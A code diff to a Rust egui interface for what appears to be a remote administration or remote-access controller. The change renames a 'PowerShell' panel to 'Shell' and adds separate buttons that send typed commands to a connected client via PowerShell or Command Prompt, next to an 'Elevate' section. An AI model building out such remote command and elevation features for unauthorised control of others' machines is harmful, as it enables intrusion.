@@ -170,7 +170,7 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                         layout_job.wrap.max_width = wrap_width;
                         ui.fonts(|f| f.layout_job(layout_job))
                     };
-                    CollapsingHeader::new("🗖  PowerShell").default_open(false)
+                    CollapsingHeader::new("🗖  Shell").default_open(false)
                     .show(ui, |ui| {
                         ui.label("Input");
                         ScrollArea::vertical().show(ui, |ui| {
@@ -198,9 +198,14 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                                 )
                             });
                         });
-                        if ui.button("Send").clicked() {
-                            let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::PowerShell(view.state.powershell.input.clone())));
-                        };
+                        ui.horizontal(|ui| {
+                            if ui.button("Send (PowerShell)").clicked() {
+                                let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::PowerShell(view.state.powershell.input.clone(), true)));
+                            };
+                            if ui.button("Send (Comamnd Prompt)").clicked() {
+                                let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::PowerShell(view.state.powershell.input.clone(), false)));
+                            };
+                        });
                     });
                     CollapsingHeader::new("🛡  Elevate")
                         .default_open(false)
